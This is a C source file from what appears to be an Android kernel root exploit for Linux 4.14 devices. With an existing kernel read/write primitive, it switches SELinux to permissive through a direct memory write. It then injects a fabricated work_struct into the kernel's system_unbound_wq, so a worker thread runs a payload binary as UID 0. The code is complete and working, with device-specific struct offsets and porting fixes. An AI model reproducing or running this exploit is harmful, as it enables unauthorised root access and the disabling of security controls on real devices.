/*
 * UMH root — call_usermodehelper via fake work_struct injection
 *
 * Injects a fabricated work_struct into the kernel's system_unbound_wq,
 * causing a worker thread to call __call_usermodehelper() which executes
 * our binary as UID 0.
 *
 * Requires pipe physrw to be set up (install_pipe_physrw) and
 * active_offsets populated with off_system_unbound_wq and
 * off_call_usermodehelper_exec_work.
 */

#include "common.h"
#include "runtime_struct_offsets.h"

/* UMH binary path and arguments (separate payload binary) */
#define UMH_BINARY_PATH "/data/local/tmp/dnroot"

/* Page layout: fake subprocess_info and umh data on the reclaimed page.
 * IMPORTANT: in this port page_base is a SINGLE 4 KB memfd page (not the
 * original order-3 32 KB slab), so the original 0x2000/0x2080 offsets wrote
 * ~0x400 bytes into arbitrary unrelated physical pages.  Place them at 0x400
 * instead: that region holds only the fake task_struct image, which is dead
 * after the PI walk/redirect (configfs R/W only touches the fops table at
 * 0x319 and the ashmem-name configfs_buffer).  Everything stays in-page. */
#define UMH_WORK_OFF 0x400
#define UMH_DATA_OFF 0x480

/* Workqueue internal struct offsets for Linux 4.14 (measured from the OSRC
 * G9700/G970W kernel/workqueue.c DWARF).  The previous values were 6.x and
 * read wq->dfl_pwq at the wrong slot (0xb0 = wq_dev) -> NULL pwq -> panic. */
#define WQ_DFL_PWQ_OFF       0xa8
#define PWQ_POOL_OFF         0x00
#define PWQ_WQ_OFF           0x08
#define PWQ_WORK_COLOR_OFF   0x10
#define PWQ_REFCNT_OFF       0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF    0x58
#define PWQ_MAX_ACTIVE_OFF   0x5c
#define POOL_WORKLIST_OFF    0x20
#define POOL_NR_IDLE_OFF     0x34
#define WORK_NR_COLORS_414   15
#define WORK_DATA_OFF        0x00
#define WORK_ENTRY_OFF       0x08
#define WORK_FUNC_OFF        0x18

/* Kernel subprocess_info layout (mirrors include/linux/umh.h) */
struct umh_subprocess_info {
  uint8_t work[32];   /* sizeof(struct work_struct) on 4.14 == 32 */
  uint64_t complete;
  uint64_t path;
  uint64_t argv;
  uint64_t envp;
  int32_t wait;
  int32_t retval;
  uint64_t init;
  uint64_t cleanup;
  uint64_t data;
};

struct umh_completion {
  uint32_t done;
  uint32_t pad0;
  uint32_t lock;
  uint32_t pad1;
  uint64_t next;
  uint64_t prev;
};

struct umh_kernel_data {
  struct umh_completion completion;
  char path[256];
  char arg[16];
  char uid[16];
  uint64_t argv[4];
  uint64_t envp[1];
};

_Static_assert(sizeof(struct umh_subprocess_info) == 96,
               "subprocess_info layout (4.14)");
_Static_assert(sizeof(struct umh_completion) == 32,
               "completion layout");

/* --- Read/write helpers: pipe physrw primary, configfs fallback --- */

static int umh_read_data(
    int fd, uintptr_t target, void *data, size_t len) {
  if (pipe_phys_read_data(fd, target, data, len))
    return 1;
  return kernel_read_data(fd, target, data, len) == (ssize_t)len;
}

static int umh_write_data(
    int fd, uintptr_t target, const void *data, size_t len) {
  if (pipe_phys_write_data(fd, target, data, len))
    return 1;
  return kernel_write_data(fd, target, data, len) == (ssize_t)len;
}

static uint64_t umh_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  umh_read_data(fd, target, &value, sizeof(value));
  return value;
}

static uint32_t umh_read32(int fd, uintptr_t target) {
  return (uint32_t)umh_read64(fd, target);
}

static int umh_write64(int fd, uintptr_t target, uint64_t value) {
  return umh_write_data(fd, target, &value, sizeof(value));
}

static int umh_write32(int fd, uintptr_t target, uint32_t value) {
  return umh_write_data(fd, target, &value, sizeof(value));
}

/* --- Wake idle workers via PTY alloc/dealloc --- */

static int wake_system_unbound(void) {
  char slave_name[128];
  int master_fd = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (master_fd < 0 || grantpt(master_fd) != 0 ||
      unlockpt(master_fd) != 0 ||
      ptsname_r(master_fd, slave_name, sizeof(slave_name)) != 0) {
    if (master_fd >= 0)
      close(master_fd);
    return 0;
  }
  int slave_fd = open(slave_name, O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (slave_fd < 0) {
    close(master_fd);
    return 0;
  }
  /* Merely opening a pty does not push the tty buffer work.  Write a byte so
   * tty_schedule_flip() runs queue_work(system_unbound_wq, &port->buf.work):
   * that wakes an idle worker of the same pool, and the worker then drains our
   * fake work item sitting at the head of the pool worklist. */
  char b = 'x';
  ssize_t wm = write(master_fd, &b, 1);
  ssize_t ws = write(slave_fd, &b, 1);
  /* leave the pty open briefly so the queued work is not cancelled by close */
  usleep(3000);
  int master_ok = close(master_fd) == 0;
  int slave_ok = close(slave_fd) == 0;
  return wm == 1 || ws == 1 || (master_ok && slave_ok);
}

/* --- Main UMH root function --- */

int install_umh_root(int configfs_fd) {
  if (!active_offsets ||
      !active_offsets->off_system_unbound_wq ||
      !active_offsets->off_call_usermodehelper_exec_work) {
    pr_error("umh: missing workqueue offsets in table\n");
    return 0;
  }

  int fd = configfs_fd;
  uintptr_t wq_image =
    KIMAGE_TEXT_BASE + active_offsets->off_system_unbound_wq;
  uintptr_t exec_work_image =
    KIMAGE_TEXT_BASE + active_offsets->off_call_usermodehelper_exec_work;

  /* 1. Disable SELinux (1-byte write via pipe physrw) */
  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  uint8_t permissive = 0;
  pr_info("umh: step1 selinux addr=%016zx\n", (size_t)selinux_addr);
  fsync(1);
  if (!pipe_phys_write_data(fd, selinux_addr,
                            &permissive, sizeof(permissive))) {
    pr_error("umh: selinux write failed\n");
    return 0;
  }
  { int ef = open("/sys/fs/selinux/enforce", O_RDONLY); char eb[8] = {0};
    if (ef >= 0) { ssize_t rn = read(ef, eb, sizeof(eb) - 1); (void)rn; close(ef); }
    pr_info("umh: step1 selinux write ok; /sys/fs/selinux/enforce='%s'\n", eb);
    fsync(1); }

  /* 2. Traverse: system_unbound_wq -> wq -> dfl_pwq -> pool */
  uintptr_t wq_slot = data_addr(wq_image);
  pr_info("umh: step2 wq_slot=%016zx dfl_pwq_off=%#x\n",
          (size_t)wq_slot, (unsigned)WQ_DFL_PWQ_OFF);
  fsync(1);
  uintptr_t wq = umh_read64(fd, wq_slot);
  pr_info("umh: step2 wq=%016zx\n", (size_t)wq);
  fsync(1);
  if (!is_direct_ptr(wq)) {
    pr_error("umh: bad wq=%016zx\n", (size_t)wq);
    return 0;
  }
  uintptr_t pwq = umh_read64(fd, wq + WQ_DFL_PWQ_OFF);
  pr_info("umh: step2 pwq=%016zx\n", (size_t)pwq);
  fsync(1);
  if (!is_direct_ptr(pwq)) {
    pr_error("umh: bad pwq=%016zx\n", (size_t)pwq);
    return 0;
  }
  uintptr_t pool = umh_read64(fd, pwq + PWQ_POOL_OFF);
  uintptr_t pwq_wq = umh_read64(fd, pwq + PWQ_WQ_OFF);
  pr_info("umh: step2 pool=%016zx pwq_wq=%016zx\n",
          (size_t)pool, (size_t)pwq_wq);
  fsync(1);

  if (!is_direct_ptr(wq) || !is_direct_ptr(pwq) ||
      !is_direct_ptr(pool) || pwq_wq != wq) {
    pr_error("umh: bad workqueue wq_slot=%016zx wq=%016zx "
             "pwq=%016zx pool=%016zx pwq_wq=%016zx\n",
             wq_slot, wq, pwq, pool, pwq_wq);
    return 0;
  }

  /* 3. Wait for pool worklist empty and idle workers available */
  uintptr_t worklist = pool + POOL_WORKLIST_OFF;
  uint64_t list_next = 0, list_prev = 0;
  uint32_t nr_idle = 0;

  for (int i = 0; i < 200; i++) {
    list_next = umh_read64(fd, worklist);
    list_prev = umh_read64(fd, worklist + sizeof(uint64_t));
    nr_idle = umh_read32(fd, pool + POOL_NR_IDLE_OFF);
    if (list_next == worklist && list_prev == worklist && nr_idle > 0)
      break;
    usleep(1000);
  }

  if (list_next != worklist || list_prev != worklist || nr_idle == 0) {
    pr_error("umh: pool busy list=%016llx/%016llx head=%016zx idle=%u\n",
             (unsigned long long)list_next,
             (unsigned long long)list_prev, worklist, nr_idle);
    return 0;
  }

  /* Validate pwq state */
  uint32_t color = umh_read32(fd, pwq + PWQ_WORK_COLOR_OFF);
  uint32_t refcnt = umh_read32(fd, pwq + PWQ_REFCNT_OFF);
  uint32_t nr_active = umh_read32(fd, pwq + PWQ_NR_ACTIVE_OFF);
  uint32_t max_active = umh_read32(fd, pwq + PWQ_MAX_ACTIVE_OFF);

  if (color >= WORK_NR_COLORS_414 || refcnt == 0 ||
      nr_active >= max_active) {
    pr_error("umh: bad pwq color=%u refcnt=%u active=%u/%u\n",
             color, refcnt, nr_active, max_active);
    return 0;
  }

  /* 4. Build fake subprocess_info + completion + umh_data on kernel page */
  uintptr_t fake_work_addr = page_base + UMH_WORK_OFF;
  uintptr_t umh_data_addr = page_base + UMH_DATA_OFF;

  struct umh_kernel_data umh_data;
  memset(&umh_data, 0, sizeof(umh_data));

  if (snprintf(umh_data.path, sizeof(umh_data.path), "%s",
               UMH_BINARY_PATH) >= (int)sizeof(umh_data.path)) {
    pr_error("umh: binary path too long\n");
    return 0;
  }
  snprintf(umh_data.arg, sizeof(umh_data.arg), "%s", "--umh");
  snprintf(umh_data.uid, sizeof(umh_data.uid), "%u", getuid());

  uintptr_t completion_addr =
    umh_data_addr + offsetof(struct umh_kernel_data, completion);
  uintptr_t wait_list_addr =
    completion_addr + offsetof(struct umh_completion, next);
  uintptr_t path_addr =
    umh_data_addr + offsetof(struct umh_kernel_data, path);
  uintptr_t arg_addr =
    umh_data_addr + offsetof(struct umh_kernel_data, arg);
  uintptr_t uid_addr =
    umh_data_addr + offsetof(struct umh_kernel_data, uid);
  uintptr_t argv_addr =
    umh_data_addr + offsetof(struct umh_kernel_data, argv);
  uintptr_t envp_addr =
    umh_data_addr + offsetof(struct umh_kernel_data, envp);

  /* Self-referencing wait list (empty completion) */
  umh_data.completion.next = wait_list_addr;
  umh_data.completion.prev = wait_list_addr;

  /* argv = { path, "--umh", uid_str, NULL } */
  umh_data.argv[0] = path_addr;
  umh_data.argv[1] = arg_addr;
  umh_data.argv[2] = uid_addr;
  umh_data.argv[3] = 0;
  umh_data.envp[0] = 0;

  /* Build fake work_struct inside subprocess_info */
  uint64_t umh_work_func = text_addr(exec_work_image);
  uintptr_t inflight_addr =
    pwq + PWQ_NR_IN_FLIGHT_OFF + color * sizeof(uint32_t);
  uint32_t nr_inflight = umh_read32(fd, inflight_addr);
  uintptr_t fake_entry = fake_work_addr + WORK_ENTRY_OFF;
  uint64_t work_data = pwq | ((uint64_t)color << 4) | 5;

  struct umh_subprocess_info fake;
  memset(&fake, 0, sizeof(fake));
  memcpy(fake.work + WORK_DATA_OFF, &work_data, sizeof(work_data));
  memcpy(fake.work + WORK_ENTRY_OFF, &worklist, sizeof(worklist));
  memcpy(fake.work + WORK_ENTRY_OFF + sizeof(uint64_t),
         &worklist, sizeof(worklist));
  memcpy(fake.work + WORK_FUNC_OFF, &umh_work_func, sizeof(umh_work_func));
  fake.complete = completion_addr;
  fake.path = path_addr;
  fake.argv = argv_addr;
  fake.envp = envp_addr;

  /* Write structures to kernel page */
  int data_ok = umh_write_data(
    fd, umh_data_addr, &umh_data, sizeof(umh_data));
  int work_ok = umh_write_data(
    fd, fake_work_addr, &fake, sizeof(fake));

  /* 6. Increment workqueue counters */
  int ctr_ok =
    umh_write32(fd, inflight_addr, nr_inflight + 1) &&
    umh_write32(fd, pwq + PWQ_NR_ACTIVE_OFF, nr_active + 1) &&
    umh_write32(fd, pwq + PWQ_REFCNT_OFF, refcnt + 1);

  /* 5. Link fake work_struct into pool worklist */
  int lp_ok = umh_write64(
    fd, worklist + sizeof(uint64_t), fake_entry);
  int ln_ok = lp_ok && umh_write64(fd, worklist, fake_entry);

  pr_info("umh: queued wq=%016zx pwq=%016zx pool=%016zx "
          "work=%016zx entry=%016zx color=%u "
          "counters=%u/%u/%u writes=%d/%d/%d/%d/%d\n",
          wq, pwq, pool, fake_work_addr, fake_entry, color,
          nr_inflight, nr_active, refcnt,
          data_ok, work_ok, ctr_ok, lp_ok, ln_ok);

  if (!data_ok || !work_ok || !ctr_ok || !ln_ok)
    return 0;

  /* 7 + 8. Wake workers via PTY, poll completion flag */
  uint32_t complete_done = 0;
  int wake_ok = 0;

  for (int i = 0; i < 8 && !complete_done; i++) {
    wake_ok |= wake_system_unbound();
    for (int j = 0; j < 250; j++) {
      complete_done = umh_read32(fd, completion_addr);
      if (complete_done)
        break;
      usleep(1000);
    }
  }

  int32_t umh_retval = (int32_t)umh_read32(
    fd, fake_work_addr + offsetof(struct umh_subprocess_info, retval));

  pr_info("umh: post worklist=%016llx entry=%016llx work_data=%016llx "
          "nr_active=%u retval=%d\n",
          (unsigned long long)umh_read64(fd, worklist),
          (unsigned long long)umh_read64(fd, worklist + sizeof(uint64_t)),
          (unsigned long long)umh_read64(fd, fake_work_addr + WORK_DATA_OFF),
          umh_read32(fd, pwq + PWQ_NR_ACTIVE_OFF), umh_retval);
  fsync(1);

  pr_info("umh: result wake=%d complete=%u retval=%d\n",
          wake_ok, complete_done, umh_retval);

  /* 9. Return success/failure */
  if (!complete_done) {
    pr_error("umh: completion timeout\n");
    return 0;
  }
  if (umh_retval != 0) {
    pr_error("umh: kernel exec failed retval=%d\n", umh_retval);
    return 0;
  }

  root_child_done = 1;
  root_uid_after = 0;
  return 1;
}

/* The UMH payload was split into a separate binary: src/payload/dnroot.c.
 * The kernel execs /data/local/tmp/dnroot --umh <uid> (see UMH_BINARY_PATH). */
